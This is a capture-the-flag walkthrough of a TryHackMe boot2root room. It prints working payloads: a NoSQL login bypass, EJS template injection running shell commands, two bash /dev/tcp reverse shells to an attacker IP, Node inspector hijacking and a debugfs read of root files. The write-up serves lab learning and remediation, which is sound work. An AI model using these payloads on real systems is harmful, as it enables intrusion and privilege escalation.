## Walkthrough: TryHackMe Room: "Do not Disturb" 

**Do Not Disturb** room on TryHackMe (part of the Hacker Holidays event series). This room features a resort-themed web application running on a Node.js stack, leveraging **NoSQL Injection**, **Server-Side Template Injection (SSTI)**, **Internal Debugger Hijacking**, and an escalation vector via **Raw Disk Group Membership**.

---

## 📊 Room Overview
* **Room Name**: Do Not Disturb
* **Category**: Web Exploitation / Boot2Root
* **Difficulty**: Medium
* **Target IP**: `10.49.165.128` (Dynamic)

---

## 🗺️ Phase 1: Reconnaissance & Enumeration

### 1. Network Mapping (Nmap)
We initiate our assessment by running an intensive service and script scan against all network ports on the target host to determine open entry points.

```bash
nmap -sC -sV -p- -T4 10.49.165.128 -oN nmap_full.txt
```

**Discovered Services:**
* **Port 22/tcp**: SSH (OpenSSH)
* **Port 80/tcp**: HTTP (Node.js / Express Web Framework)

### 2. Web Directory Discovery
Navigating directly to `http://10.49.165.128` presents a resort wellness application called *The Byte Lotus*. There are no obvious interactive points or administrative menus displayed. To map hidden architecture components, we execute directory brute-forcing.

```bash
gobuster dir -u http://10.49.165 -w /usr/share/wordlists/dirb/common.txt -x php,html,js,json
```

**Discovered Endpoints:**
* `/staff` (Triggers an internal application redirect to `/login`)
* `/logout`

---

## 🔓 Phase 2: Weaponization & Exploitation

### 1. NoSQL Authentication Bypass
Visiting the `/login` panel exposes a standard web form requesting a **Staff / Guest ID** and a **Passphrase**. Standard SQL injection primitives (e.g., `' OR '1'='1`) yield an immediate `Invalid credentials` error. 

Given the application stack runtime context headers (`X-Powered-By: Express`), the backend likely uses a NoSQL database tier such as MongoDB. NoSQL query engines accept structured query parameters rather than sanitizing raw relational strings. 

By passing input fields as key-value objects using bracket array notation, we force the query parser to treat inputs dynamically.

* **Payload Construction**:
  * **Staff / Guest ID**: `attendant`
  * **Passphrase**: `password[$ne]=x`

* **Raw HTTP Query String Parameters**:
  ```text
  username=attendant&password[$ne]=x
  ```

**Vulnerability Analysis**:
The internal backend query syntax resolves directly to:
```javascript
users.findOne({
  username: "attendant",
  password: { $ne: "x" }
})
```
Because the database searches for the account name `attendant` and evaluates if the structural password data is **Not Equal (`$ne`)** to the arbitrary character `"x"`, the logical logic checks out as valid, successfully logging us past authentication without a password string.

---

### 2. Server-Side Template Injection (SSTI)
Once inside the authenticated portal, we find an input field reflecting user data directly onto a dashboard confirmation panel. Testing for templating syntax processing reveals the presence of an **EJS (Embedded JavaScript)** execution vulnerability.

* **Fuzzing Tag Payload**: `<%= 7 * 7 %>`
* **Observation**: The server renders `49` to the browser, confirming raw template engine code execution context.

We leverage the built-in Node.js runtime environment capabilities to bridge out from the application space into an underlying OS system process context.

#### Reading the User Flag
We inject the following JavaScript layout command payload inside the template evaluation boundaries:
```html
<pre><%= process.getBuiltinModule('child_process').execSync('cat /home/poolside/user.txt').toString() %></pre>
```
* **Result**: The text prints cleanly to our browser layout framework, yielding the first objective.
* **User Flag**: `THM{................}`

#### Spawning a Terminal Footprint (Reverse Shell #1)
To run terminal commands interactively, we stand up an active network pipeline listener on our attack frame:
```bash
nc -lvnp 4445
```

We submit the primary connection string payload back through the vulnerable EJS field to drop an initial system shell wrapper (replace `10.49.92.195` with your current instance IP profile):
```html
<% process.getBuiltinModule('child_process').exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.49.92.195/4445 0>&1'"); %>
```

Checking our listener window displays an established terminal prompt acting as the low-privilege service account: **`poolside`**.

---

## 🔄 Phase 3: Lateral Movement & Privilege Escalation

### 1. Internal Port Discovery
Inspecting system identity parameters (`id`) and disk block storage infrastructure layouts (`lsblk`) confirms we are locked into the `poolside` environment with no direct paths to read admin space boundaries.

However, auditing running internal services indicates an operational background node telemetry application runtime (`lotus-telemetry.service`) running internally. Crucially, the process left an unauthenticated Node.js inspector instance bound strictly to localhost on port **`9229`**.

Because this loopback instance is managed natively by a different service identity account named **`pipelinesvc`**, hijacking the debugger allows us to pivot users.

### 2. Exploiting the Local Node Inspector
We establish a second listener handler interface on our attack platform to prepare for the incoming connection upgrade:
```bash
nc -lvnp 4446
```

From our current active `poolside` reverse terminal shell, we hook directly into the open inspection environment:
```bash
node inspect 127.0.0.1:9229
```

Once the terminal drops down into the operational execution scope, we switch contexts into the dynamic interactive system shell interpreter:
```text
debug> repl
Press Ctrl+C to leave debug repl
>
```

We instruct the `pipelinesvc` worker process to drop a parallel terminal link straight back to our secondary listener interface instance on port `4446`:
```javascript
process.getBuiltinModule('child_process').exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.49.92.195/4446 0>&1'")
```

---

## 👑 Phase 4: Overprivilege Escalation & Root Extraction

### 1. Analyzing the "Disk" Group Vector
Checking our newly established terminal environment profile context via port `4446` shows a structural transformation:
```bash
id
# uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

Our active context user is now an explicit member of **`6(disk)`**. In Linux operating architecture configurations, the `disk` group layer maintains raw binary read and write authorization over physical blocks of hardware media (block storage devices).

We map out the partition storage block structures mapping back to the filesystem:
```bash
lsblk -o NAME,FSTYPE,SIZE,MOUNTPOINTS
```

**Storage Layout Mapping Matrix:**
```text
nvme0n1                 20G 
└─nvme0n1p1 ext4        20G /
```
The active operating system root architecture (`/`) resides raw inside device directory location path block **`/dev/nvme0n1p1`**. Checking the hardware block files:
```bash
ls -l /dev/nvme0n1p1
# brw-rw---- 1 root disk 259, 2 Aug  2 16:01 /dev/nvme0n1p1
```
Because the `disk` assignment permissions permit structural `rw` capabilities directly, our process can step past the regular file security configurations managed by the running Linux kernel by parsing drive block allocations natively.

### 2. Bypassing OS Controls via Debugfs
Rather than modifying the kernel state or trying to execute binary escalation files via `sudo` vectors, we bypass the OS permission locks entirely. We pull the raw block bits matching the root flag structure manually by invoking a filesystem maintenance and troubleshooting engine called `debugfs`.

Execute the following extraction string command directly from the shell prompt:
```bash
/usr/sbin/debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1
```
* **Command Explanation**: Tells `debugfs` to step over system runtime permission limitations, look up the raw hardware nodes mapping to the destination location `/root/root.txt` inside the block storage layer `/dev/nvme0n1p1`, and stream the data blocks directly back to our prompt interface.

* **Root Flag**: `THM{....................}`

---
### 🛠️ Key Takeaways / Remediation Tips
1. **Secure Parametric Binding**: Avoid passing user input directly into data models without sanitizing input types. Node query parser middleware layers should reject parameters containing structural array values (`[]`) where a flat string parameter value is required.
2. **Input Sanitization in Engines**: EJS and alternative page-building template engines should be strictly sandboxed, or user strings should be stripped of special logical tag strings like `<%= %>`.
3. **Local Loopback Security**: Debugging or code evaluation channels should require authentication parameters even when listening strictly to inner local ports (`127.0.0.1`).
4. **Principle of Least Privilege**: Accounts managing pipeline automation tasks should not maintain standard secondary administrative group classifications like `disk`, as this effectively neutralizes filesystem-level file access security.
